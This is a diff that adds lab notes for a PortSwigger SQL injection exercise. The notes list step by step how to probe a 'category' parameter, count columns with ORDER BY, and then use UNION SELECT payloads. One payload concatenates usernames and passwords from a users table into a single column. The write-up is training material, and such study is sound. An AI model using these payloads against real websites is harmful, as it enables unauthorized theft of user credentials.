@@ -218,3 +218,25 @@ Steps:
 	4a. category=Gifts' UNION SELECT NULL,NULL--
 	4b. category=Gifts' UNION SELECT username,password FROM users--
 ```
+
+
+###### Lab: SQL injection UNION attack, retrieving multiple values in a single column
+URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+Endpoint: category
+
+Steps:
+```
+1. Click on any filter item.
+2. Add ' to verify if sql injection exists.
+3. Use the Order Clause to check the number of items that are being returned.
+	3a. category=Gifts'+ORDER+BY+1--
+	Response: Returns products
+	3b. category=Gifts'+ORDER+BY+2--
+	Response: Returns products
+	3c. category=Gifts'+ORDER+BY+3--
+	Response: Internal server error
+4.  Use UNION Payload
+	4a. category=Gifts' UNION SELECT NULL,NULL--
+	4b. category=Gifts' UNION SELECT username,password FROM users--
+	4c. category=Lifestyle' UNION SELECT NULL,CONCAT(username, '~', password) FROM users--
+```
